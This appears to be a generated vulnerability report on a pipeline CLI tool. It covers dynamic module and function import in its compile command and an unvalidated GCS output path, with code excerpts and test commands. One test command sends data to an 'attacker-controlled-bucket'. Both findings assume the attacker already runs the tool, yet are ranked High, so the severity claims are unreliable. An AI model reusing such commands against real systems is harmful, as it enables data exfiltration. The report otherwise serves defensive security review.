## Combined Vulnerability Report

### Vulnerability 1: Arbitrary code execution via module and function injection in `compile` command

*   **Description:**
    An attacker can execute the `pipelines-cli compile` command and provide malicious input for the `module_name` and `function_name` arguments. The `compile` command in `src/pipelines/console.py` then calls `pipeline_compiler.compile` with these arguments. In `src/pipelines/pipeline_compiler.py`, the `_get_function_obj` function is called which uses `importlib.import_module(f"pipelines.{module_name}")` to dynamically import a module and `getattr(module, function_name)` to retrieve a function. Due to lack of input validation on `module_name` and `function_name`, an attacker can manipulate these arguments to import unintended modules within the `pipelines` package and call arbitrary functions within those modules. If an attacker can find and specify a module and function combination that leads to execution of dangerous operations, they can achieve arbitrary code execution.

    **Steps to trigger the vulnerability:**
    1. Execute the `pipelines-cli compile` command.
    2. Provide malicious input for the `module_name` and `function_name` arguments.
    3. The application dynamically imports a module and retrieves a function based on the attacker-controlled input.
    4. If a malicious module and function combination is provided, arbitrary code execution can occur.

*   **Impact:** Arbitrary code execution on the system running the `pipelines-cli` command. This could allow the attacker to read sensitive data, modify files, or compromise the system.

*   **Vulnerability Rank:** High

*   **Currently implemented mitigations:** None. The code directly uses user-provided input for module and function names in dynamic import and function call operations without any validation or sanitization.

*   **Missing mitigations:**
    *   Input validation and sanitization for `module_name` and `function_name` in the `compile` command.
    *   Implement a whitelist of allowed modules and functions that can be used in the `compile` command.
    *   Avoid dynamic import and `getattr` if possible, or restrict their usage to a safe and predefined set of modules and functions.

*   **Preconditions:** The attacker must have the ability to execute the `pipelines-cli compile` command.

*   **Source code analysis:**
    - File: `/code/src/pipelines/pipeline_compiler.py`
    ```python
    def _get_function_obj(module_name: str, function_name: str) -> Callable:
        """Returns function object given path to module file and function name."""
        module = importlib.import_module(f"pipelines.{module_name}") # [Vulnerable line] - Dynamic import with user-controlled module_name
        return getattr(module, function_name) # [Vulnerable line] - Dynamic function call with user-controlled function_name

    def compile(module_name: str, function_name: str, package_path: str) -> None:
        """Compiles pipeline function as string into JSON specification."""
        pipeline_func = _get_function_obj(module_name, function_name) # [Call to vulnerable function]
        _compile_pipeline_func(pipeline_func, package_path_)
    ```
    The `_get_function_obj` function in `/code/src/pipelines/pipeline_compiler.py` is vulnerable because it directly uses the `module_name` and `function_name` provided by the user as arguments to `importlib.import_module` and `getattr`.

*   **Security test case:**
    1. **Setup:** Ensure the `pipelines-cli` is installed and functional.
    2. **Create malicious command:** Construct a `pipelines-cli compile` command to call `get_timestamp` from `utils` module as a proof of concept for dynamic function call:
    ```bash
    pipelines-cli compile utils get_timestamp output.json
    ```
    3. **Execute command:** Run the crafted `pipelines-cli compile` command in the shell.
    4. **Verify execution:** Check if the command executes without errors. Successful execution demonstrates the ability to dynamically call functions using the `compile` command, highlighting the vulnerability of dynamic import and `getattr` without input validation.

---

### Vulnerability 2: Pipeline Input Injection via `gcs_filepath` parameter

*   **Description:**
    An attacker can inject malicious values into the `gcs_filepath` pipeline parameter via the `-p` option in the `pipelines-cli run` command. This parameter, used in the `sample_pipeline.py`, directly controls the output file path in Google Cloud Storage (GCS) for the `_save_message_to_file` component. By manipulating this parameter, an attacker could potentially overwrite or write files to arbitrary GCS paths accessible by the pipeline's service account. This is a pipeline input injection vulnerability because user-controlled input directly influences the pipeline's behavior without proper validation or sanitization within the pipeline code itself.

    **Steps to trigger the vulnerability:**
    1. Compile the `sample_pipeline.py` using `pipelines-cli compile sample_pipeline pipeline gs://path/to/pipeline.json`.
    2. Prepare a `pipeline-run-config.yaml` file with necessary configurations.
    3. Execute the pipeline using `pipelines-cli run pipeline-run-config.yaml -p "message=Malicious Content" -p "gcs_filepath=gs://attacker-controlled-bucket/malicious-file.txt"`.
    4. Observe that the pipeline attempts to write "Malicious Content" to the GCS path `gs://attacker-controlled-bucket/malicious-file.txt`.

*   **Impact:**
    High. Successful exploitation could lead to:
    *   **Data exfiltration/modification:** Write arbitrary content to GCS buckets, potentially exfiltrating data or modifying existing data.
    *   **Privilege escalation (in some scenarios):** Overwrite critical system files in GCS if the service account has overly permissive access.
    *   **Information disclosure:** Write data to attacker-accessible locations.

*   **Vulnerability Rank:** High

*   **Currently implemented mitigations:** None. No input validation or sanitization is implemented for pipeline parameters, including `gcs_filepath`.

*   **Missing mitigations:**
    *   Input validation and sanitization within the pipeline component for `gcs_filepath`.
        *   Path validation: Ensure the path conforms to expected patterns (e.g., starts with `gs://`, bucket name is valid).
        *   Path restriction: Restrict the output path to a predefined set of allowed buckets or directories.
    *   Principle of least privilege for service accounts: Ensure the service account has minimal necessary GCS write permissions.

*   **Preconditions:**
    *   The attacker needs to be able to execute the `pipelines-cli run` command.
    *   The Kubeflow pipeline is configured to use a service account with GCS write permissions.
    *   The pipeline uses user-provided input to construct file paths, like `gcs_filepath` in `sample_pipeline.py`.

*   **Source code analysis:**

    1.  **`src/pipelines/console.py`:** The `run` command parses `-p` options using `_parse_pipeline_args`.
    2.  **`src/pipelines/console.py` - `_parse_pipeline_args`:** No validation or sanitization is performed.
    3.  **`src/pipelines/pipeline_runner.py` - `run`:** User-provided parameters are passed to `vertex.PipelineJob`.
    4.  **`src/pipelines/sample_pipeline.py` - `_save_message_to_file` component:**
    ```python
    @dsl.component(base_image="python:3.10", packages_to_install=["cloudpathlib==0.10.0"])
    def _save_message_to_file(message: str, gcs_filepath: str) -> None:
        """Saves a given message to a given file in GCS."""
        import cloudpathlib as cpl

        with cpl.CloudPath(gcs_filepath).open("w") as fp: # gcs_filepath is directly used here
            fp.write(message)
    ```
    `_save_message_to_file` directly uses `gcs_filepath` without validation.

*   **Security test case:**

    **Pre-requisites:** GCP project with Vertex AI Pipelines, Terraform setup, `pipelines-cli` installed, `pipeline-run-config.yaml` configured, service account with GCS write access.

    **Steps:**
    1.  **Compile the sample pipeline:**
        ```bash
        pipelines-cli compile sample_pipeline pipeline gs://path/to/pipeline.json
        ```
    2.  **Prepare `pipeline-run-config.yaml`**.
    3.  **Execute pipeline with malicious `gcs_filepath`:**
        ```bash
        pipelines-cli run pipeline-run-config.yaml \
            -p "message=This is a test of file overwrite vulnerability" \
            -p "gcs_filepath=gs://attacker-controlled-bucket/pwned.txt"
        ```
    4.  **Verify exploit:** Check `gs://attacker-controlled-bucket/pwned.txt` for the message, confirming arbitrary GCS write.